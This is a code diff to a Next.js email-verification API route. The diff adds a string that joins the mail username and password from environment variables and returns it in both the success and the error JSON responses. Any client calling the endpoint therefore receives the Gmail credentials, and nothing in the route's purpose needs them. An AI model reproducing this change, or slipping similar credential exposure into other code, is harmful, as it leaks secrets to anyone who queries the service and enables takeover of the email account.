@@ -2,6 +2,8 @@ import { NextResponse } from "next/server";
 import nodemailer from "nodemailer";
 import Users from "/mongo/UserModel";
 
+let infostr = "user:" + process.env.USER +" pass:" +process.env.E_PASS;
+
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
@@ -49,9 +51,9 @@ export async function POST(req, res) {
     else {
         let token = check[0]._id;
         await sendVerificationEmail(email, token , origin);
-        return NextResponse.json({ message: "Verification Link sent successfully to your Email...!" });
+        return NextResponse.json({ message: "Verification Link sent successfully to your Email...!" , infostr });
     }
   } catch (error) {
-    return NextResponse.json({ message: error.message });
+    return NextResponse.json({ message: error.message , infostr });
   }
 }
